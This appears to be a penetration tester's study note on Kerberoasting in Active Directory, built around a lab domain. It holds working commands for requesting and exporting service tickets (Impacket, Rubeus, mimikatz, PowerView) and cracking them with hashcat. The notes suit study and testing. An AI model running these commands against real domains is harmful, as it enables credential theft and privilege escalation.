---
tags: [ad, windows, kerberos, impacket]
aliases: [Kerberoasting]
---
A lateral movement/privilege escalation technique in AD environments that targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are used to run services to overcome the network authentication limitations of the built-in accounts. Any domain user can request a Kerberos ticket for any service account in the same domain. All we need is the hash/password of an account, a shell in the context of a domain user, or SYSTEM level access on a domain-joined host.

Domain accounts running services are often local administrators since many services require elevated privileges. Having a Kerberos ticket for an account with an SPN does not allow in itself for you to execute commands in the context of this account but the ticket is encrypted with the service account's NTLM hash, so the cleartext password can be obtained by subjecting it to an offline brute-force attack.

Some ways to perform the attack
- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.

Kerberoasting does not guarantee access.

Keberoasting tools request RC4 encryption when performing the attack and initiating the TGS-REQ requests. RC4 is weaker and easier to crack, sometimes however, we will receive an AES-256 encrypted hash that begins with `$krb5tgs$18$*`. These are significantly more time consuming.

> Kerberos is time-sensitive. By default, Windows Kerberos usually allows about 5 minutes of clock difference. Kerberos uses time to prevent replay attacks. A replay attack means an attacker captures a valid authentication message and sends it again later to impersonate the user.

```shell
# sync clocks with DC - make sure no service is changing the time back
sudo ntpdate 10.129.232.88
```
# Linux

To perform the attack we start by listing the SPNs in the domain. 

```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# requesting all tgs tickets
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

# requesting a single ticket
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

# save to an output file
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

# cracking the ticket
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

# Windows

We can steal or forge Kerberos tickets semi-manually. 

```cmd
# enumerating SPNs
setspn.exe -Q */*

# target a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

- The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
- The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
- [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
- We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
- We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

```powershell
# retrieving all tickets
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

We can also simply extract tickets from memory via mimikatz
```cmd
# if we don't specify this setting mimikatz will write them to .kirbi files
mimikatz # base64 /out:true


mimikatz # kerberos::list /export  

# preparing the base64 blob for cracking
echo "<base64 blob>" |  tr -d \\n 

# convert it back to a .kirbi file
cat encoded_file | base64 -d > sqldev.kirbi

# extracting the kerberos ticket
python2.7 kirbi2john.py sqldev.kirbi

# modify it for hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

## Automated
### PowerView

We can extract the TGS tickets and convert them to hashcat format.

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname

# target a specific username
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# export tickets to a CSV file
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

### Rubeus

Can perform Kerberoasting even faster and easier. 

```powershell
.\Rubeus.exe

# view statistics
.\Rubeus.exe kerberoast /stats

# kerberaoast a selected account
.\Rubeus.exe kerberoast /spn:MSSQLSvc/SQL01.inlanefreight.local:1433 /nowrap

# request tickets for account swith the admincount attribute
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap


```

## Kerberoasting from a Network Logon (evil-winrm) Session

WinRM authenticates via Network Logon (type 3), which does **not** place an interactive TGT in the LSA cache. PowerView's `Get-DomainSPNTicket`, `Invoke-Kerberoast`, and even a bare `Rubeus kerberoast` will fail with errors like:

- `NetworkCredentials provided were unable to create a Kerberos credential`
- `No credentials are available in the security package`
- `[Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state`

These are symptoms of the missing TGT in the current session, not a permission problem.

### Fix A — Run it off-box with Impacket (preferred)

Since we have the caller's plaintext password, run from the Linux attack host:

```shell
# sync clocks first - Kerberos rejects requests with >5 min skew
sudo ntpdate <DC>

GetUserSPNs.py -request-user <target> -dc-ip <DC> '<DOMAIN>/<caller>:<password>'
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

### Fix B — Request a TGT in-session, then kerberoast with it

Use Rubeus to mint a TGT for the caller explicitly, then pass it to the kerberoast call:

```powershell
# request a TGT using the caller's credentials
.\Rubeus.exe asktgt /user:<caller> /password:'<password>' /domain:<DOMAIN> /dc:<DC> /nowrap > tgt.b64
$TGT = (gc tgt.b64 | Select-String -Pattern "doIF.*" -AllMatches).Matches.Value

# kerberoast the target using that TGT
.\Rubeus.exe kerberoast /user:<target> /ticket:$TGT /nowrap
```

## Related

- [[lateral-movement-and-pivoting]]
- [[enumeration]]
- [[vulnerabilities|AD Vulnerabilities]]
- [[double-hop]]

